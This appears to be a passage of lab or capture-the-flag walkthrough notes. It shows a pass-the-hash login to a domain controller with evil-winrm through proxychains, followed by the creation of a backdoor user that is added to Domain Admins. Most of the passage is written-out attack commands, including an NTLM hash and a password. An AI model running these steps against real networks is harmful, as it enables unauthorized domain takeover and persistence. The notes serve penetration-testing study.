
$ `proxychains4 /usr/bin/evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.113.102`

![[Connect CORPDC with evil-winrm-20240711134443095.webp]]

You'll get a shell.  
Check out the hostname.

Evil-WinRM PS C:\Users\Administrator\Documents> `hostname`

![[Connect CORPDC with evil-winrm-20240711134533300.webp]]

### Create a new user as an Administrator

Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos K41r@s123 /add /domain`

Username: kairos  
Password: K41r@s123

### Enumerate the groups to find the group name for the Administrator user

Evil-WinRM* PS C:\Users\Administrator\Documents> `net group`

![[Connect CORPDC with evil-winrm-20240711134633470.webp]]

### Add the new user to this group to make him the `Domain Admin`.

Evil-WinRM* PS C:\Users\Administrator\Documents> `net group "Domain Admins" kairos /add /domain`

### Display user's information

The `net user` command is a Windows command-line utility that can be used to display or modify user account information. The `/domain` switch is used with `net user` to specify that the operation should be performed on a domain controller, allowing you to view or change user account information in a domain environment.

Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos /domain`

![[Connect CORPDC with evil-winrm-20240711134239749.webp]]

**Next step:** [[RDP to CORPDC]]
